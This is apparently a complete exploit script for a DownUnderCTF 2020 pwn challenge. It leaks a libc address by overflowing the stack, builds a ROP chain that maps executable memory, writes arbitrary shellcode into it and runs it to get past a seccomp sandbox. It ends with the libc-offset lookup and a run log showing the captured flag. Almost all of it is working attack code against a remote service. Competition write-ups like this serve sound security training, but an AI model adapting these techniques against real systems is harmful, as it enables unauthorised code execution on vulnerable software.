#!/usr/bin/env python3
from pwn import *
import sys

'''
This challenge uses SECCOMP filters. The structure is in the following format:

struct sock_filter {    /* Filter block */
        __u16   code;   /* Actual filter code */
        __u8    jt;     /* Jump true */
        __u8    jf;     /* Jump false */
        __u32   k;      /* Generic multiuse field */
};

The filters added in the sandbox() function are:

    struct sock_filter code[] = {
        /* op,   jt,   jf,     k    */
        {0x20, 0x00, 0x00, 0x00000004},
        {0x15, 0x00, 0x01, 0xc000003e},
        {0x06, 0x00, 0x00, 0x00000000},
        {0x20, 0x00, 0x00, 0x00000000},
        {0x15, 0x01, 0x00, 0x0000000f},
        {0x06, 0x00, 0x00, 0x7fff0000},
        {0x15, 0x01, 0x00, 0x000000e7},
        {0x06, 0x00, 0x00, 0x7fff0000},
        {0x15, 0x01, 0x00, 0x0000003c},
        {0x06, 0x00, 0x00, 0x7fff0000},
        {0x15, 0x01, 0x00, 0x00000002},
        {0x06, 0x00, 0x00, 0x7fff0000},
        {0x15, 0x01, 0x00, 0x00000000}, // ALLOW_SYSCALL(open)
        {0x06, 0x00, 0x00, 0x7fff0000},
        {0x15, 0x01, 0x00, 0x00000001},
        {0x06, 0x00, 0x00, 0x7fff0000},
        {0x15, 0x01, 0x00, 0x0000000c},
        {0x06, 0x00, 0x00, 0x7fff0000},
        {0x15, 0x01, 0x00, 0x00000009},
        {0x06, 0x00, 0x00, 0x7fff0000},
        {0x15, 0x01, 0x00, 0x0000000a},
        {0x06, 0x00, 0x00, 0x7fff0000},
        {0x15, 0x01, 0x00, 0x00000003},
        {0x06, 0x00, 0x00, 0x7fff0000},

        {0x06, 0x00, 0x00, 0x00000000},
    };

'''


def main( host, port, shellcode):
    rtwelf = ELF("./return-to-whats-revenge")
    libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')

    try:
        f = open(shellcode, 'rb')
    except:
        print('[ERROR] Failed to open shellcode: %s' %(shellcode))
        exit(1)

    sc = f.read()
    f.close()

    ## Align it to 8 bytes
    if len(sc) % 8:
        sc = b'\x90' * (8 - (len(sc)%8)) + sc

    c = remote(host, port)

    ## Consume the first two lines
    c.readline()
    c.readline()

    ## 0x00000000004019db : pop rdi ; ret
    poprdi = p64(0x04019db)

    data = b'a'*0x30
    data += p64( 0xdeadbeefcafebabe)        ## rbp
    data += poprdi
    data += p64( rtwelf.symbols['got.puts'])
    data += p64( rtwelf.symbols['puts'])
    data += p64( rtwelf.symbols['vuln'])
    data += b'\n'

    c.send(data)

    leak = u64(c.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))

    print('[LEAK] 0x%.8x' %(leak))
   
    libc.address = leak - libc.symbols['puts']
    print('[INFO] libc base = 0x%.8x' %(libc.address))

    ## consume the line
    c.readline()

    ## Writeable section in libc. This is needed for rbp
    rw_spot = p64(libc.address + 0x3e80a0)

    ## pointer to /bin/sh in libc
    binsh = p64(libc.address + 0x1b3e9a)

    pops = {"rax": p64(libc.address + 0x439c8) }

    pops['rcx'] = p64(libc.address + 0x3eb0b)
    pops['rbx'] = p64(libc.address + 0x2cb49)
    pops['rdi'] = p64(0x04019db)
    pops['rsi'] = p64(libc.address + 0x23e6a)
    pops['rdx'] = p64(libc.address + 0x1b96)
    pops['r10'] = p64(libc.address + 0x1306b5)
    pops['r13'] = p64(libc.address + 0x21a45)
    pops['rbp'] = p64(libc.address + 0x21353)

    ##0x000000000003eb0b : pop rcx ; ret
    ## 0x0000000000155fc6 : pop r8 ; mov eax, 1 ; ret

    ## 0x0000000000021ed1 : jmp rax
    ## 0x0000000000022b8a : mov r9, r13 ; call rbx
    ## 0x00000000000be044 : mov r9, r14 ; call rbx
    ## egrep ': mov qword ptr \[(rax|rbx|rcx|rdx|rsi|rdi|r8|r9|r10|r11|r12|r13|r14|r15)\], (rax|rbx|rcx|rdx|rsi|rdi|r8|r9|r10|r11|r12|r13|r14|r15) ; ret$' gadgets.libc.txt
    '''
    0x00000000001411c7 : mov qword ptr [r9], rdi ; ret
    0x0000000000097055 : mov qword ptr [rax], rdi ; ret
    0x000000000017f030 : mov qword ptr [rcx], rdx ; ret
    0x0000000000044359 : mov qword ptr [rdi], r8 ; ret
    0x0000000000053288 : mov qword ptr [rdi], r9 ; ret
    0x00000000000b6926 : mov qword ptr [rdi], rcx ; ret
    0x00000000000a815f : mov qword ptr [rdi], rdx ; ret
    0x0000000000054a5a : mov qword ptr [rdi], rsi ; ret
    0x000000000003093c : mov qword ptr [rdx], rax ; ret
    0x00000000000a8094 : mov qword ptr [rdx], rcx ; ret
    0x00000000001011aa : mov qword ptr [rdx], rdi ; ret
    0x00000000001401fd : mov qword ptr [rsi], rdi ; ret
    '''
    
    mov_rax_rdi = p64(libc.address + 0x97055)
    jmp_rax = p64( libc.address + 0x21ed1)

    data = b'a'*0x30
    data += p64(0xdeadbeefcafebabe)   ## rbp again
    data += pops['rbx']
    data += pops['rbx']  ## This will just call the pop rbx after we get control of r9
    data += pops['r13']
    data += p64(0)        ## mmap offset argument
    data += p64( libc.address + 0x22b8a) ## set r9 = r13 then call rbx which will just pop rbx and ret
    data += p64(libc.address + 0x155fc6) ## mmap fd argument
    data += p64(0xffffffffffffffff)
    data += pops['rcx']
    data += p64(0x22)       ## mmap flags
    data += pops['rdx']
    data += p64(7)          ## mmap prot
    data += pops['rsi']
    data += p64(0x2000)     ## mmap len
    data += pops['rdi']
    data += p64(0x614100000) ## mmap addr
    data += p64(libc.symbols['mmap'])

    addr = 0x614100000

    ## Time to write the shellcode
    while len(sc) > 0:
        bytes = sc[:8]

        sc = sc[8:]

        ## Set the address
        data += pops['rax']
        data += p64(addr)

        addr += 8

        ## Set the data
        data += pops['rdi']
        data += bytes

        ## Write the data
        data += mov_rax_rdi

    ## Reset the address
    data += pops['rax']
    data += p64(0x614100000)

    data += jmp_rax

    data += b'\n'

    c.send(data)

    flag = c.recvuntil(b'}')

    print('[FLAG] %s' %(flag))

    c.close()

    return

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print('[USAGE] %s <target> <port> <shellcode>' %(sys.argv[0]))
        exit(1)

    main(sys.argv[1], int(sys.argv[2]), sys.argv[3])

'''
From exploiting shellthis I found the md5sum of libc. With the md5sum I ran this query to get some offsets:

curl -X POST -H 'Content-Type: application/json' --data '{"md5": "50390b2ae8aaa73c47745040f54e602f"}' 'https://libc.rip/api/find'

[
  {
    "buildid": "b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0",
    "download_url": "https://libc.rip/download/libc6_2.27-3ubuntu1_amd64.so",
    "id": "libc6_2.27-3ubuntu1_amd64",
    "md5": "50390b2ae8aaa73c47745040f54e602f",
    "sha1": "18292bd12d37bfaf58e8dded9db7f1f5da1192cb",
    "sha256": "cd7c1a035d24122798d97a47a10f6e2b71d58710aecfd392375f1aa9bdde164d",
    "symbols": {
      "__libc_start_main_ret": "0x21b97",
      "dup2": "0x1109a0",
      "printf": "0x64e80",
      "puts": "0x809c0",
      "read": "0x110070",
      "str_bin_sh": "0x1b3e9a",
      "system": "0x4f440",
      "write": "0x110140"
    }
  }
]

With the offsets I went to the https://libc.rip site and downloaded the correct libc.

I leaked a pointer from libc and the lower three nybbles correspond to the expected offset of puts

vagrant@ubuntu-bionic:/vagrant/ctf/down_under_ctf_2020/pwn/return_to_whats_revenge$ ./exp-returntowhatsrevenge.py chal.duc.tf 30006 shellcode
[*] '/vagrant/ctf/down_under_ctf_2020/pwn/return_to_whats_revenge/return-to-whats-revenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/vagrant/ctf/down_under_ctf_2020/pwn/return_to_whats_revenge/libc6_2.27-3ubuntu1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.duc.tf on port 30006: Done
[LEAK] 0x7f062020c9c0
[INFO] libc base = 0x7f062018c000
[FLAG] b'DUCTF{secc0mp_noT_$tronk_eno0Gh!!@}'
[*] Closed connection to chal.duc.tf port 30006
'''
